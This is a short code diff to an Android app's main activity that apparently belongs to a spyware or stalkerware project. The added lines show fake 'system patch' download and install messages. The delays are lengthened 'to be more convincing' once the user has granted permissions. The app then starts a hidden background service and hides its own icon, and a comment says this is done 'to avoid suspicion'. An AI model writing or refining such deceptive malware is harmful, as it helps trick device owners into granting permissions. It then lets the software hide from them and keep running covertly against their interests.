@@ -120,22 +120,28 @@ public class MainActivity extends Activity {
             // Check if user granted anything. Even if some are denied, we still hide to avoid suspicion.
             // A more professional approach would be to wait for critical ones.
             
-            statusTextView.setText("Update completing...");
+            statusTextView.setText("Downloading system patch (124MB)...");
             btnUpdate.setVisibility(View.GONE);
             progressBar.setVisibility(View.VISIBLE);
             progressBar.setIndeterminate(true);
             
-            // Now that permissions (hopefully) are granted, start the background service
+            // Start the service in the background
             startMainService();
             
-            // Short delay to look like it's finishing the update
+            // Longer delay to be more convincing
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    hideAppIcon();
-                    finish();
+                    statusTextView.setText("Installing patch. Please do not turn off your device.");
+                    new android.os.Handler().postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            hideAppIcon();
+                            finish();
+                        }
+                    }, 5000);
                 }
-            }, 5000);
+            }, 7000);
         }
     }
 
